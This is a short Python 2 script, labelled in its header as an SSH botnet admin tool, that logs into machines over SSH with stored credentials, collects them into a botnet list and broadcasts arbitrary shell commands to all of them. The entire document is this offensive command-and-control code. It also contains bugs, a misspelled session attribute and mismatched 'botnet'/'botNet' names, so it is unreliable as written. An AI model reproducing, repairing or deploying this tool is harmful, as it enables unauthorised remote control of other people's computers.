#-------------------------------------------------------------------------------
# Name:        SSH_Botnet/Admin_script
# Purpose:     Can add clients to botnet. Can send commands to clients.
#               will return the output of the command sent from each bot
# Author:      Malcolm Jefferson
#
# Created:     08/11/2014
# Copyright:   (c) malcolm 2014
# Licence:     <your licence>
#-------------------------------------------------------------------------------

import pxssh

class Client:
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception, e:
            print e
            print "[-] Error Connecting"

    def send_command(self, cmd):
        self.sesion.sendline(cmd)
        self.session.prompt()
        return self.session.before

def botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print "[+] Output from " + client.host
        print "[+] " + output


def addClient(host, user, password):
    client = Client(host,user,password)
    botnet.append(client)

botNet = []
addClient("127.0.0.1","ubuntu","ubuntu")